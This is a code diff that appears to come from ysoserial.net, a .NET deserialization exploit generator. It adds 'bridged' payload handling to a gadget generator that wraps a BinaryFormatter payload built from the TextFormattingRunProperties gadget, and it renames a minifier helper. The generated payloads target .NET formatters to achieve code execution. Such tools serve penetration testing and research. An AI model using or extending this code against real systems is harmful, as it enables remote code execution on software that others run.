@@ -34,11 +34,24 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer"};
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                IGenerator generator = new TextFormattingRunPropertiesGenerator();
+                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs); // we could have used AxHostStateGeneratorGadget directly here but it wouldn't have passed our other potential filters using the user input
+            }
 
-            IGenerator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs); // we could have used AxHostStateGeneratorGadget directly here but it wouldn't have passed our other potential filters using the user input
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             AxHostStateMarshal payloadAxHostMarshal = new AxHostStateMarshal(Convert.FromBase64String(b64encoded));
@@ -59,11 +72,11 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = XmlMinifier.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor"}, null, FormatterType.NetDataContractXML, true);
+                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor"}, null, FormatterType.NetDataContractXML, true);
                     }
                     else
                     {
-                        payload = XmlMinifier.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
+                        payload = XmlHelper.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
                     }
                 }
 
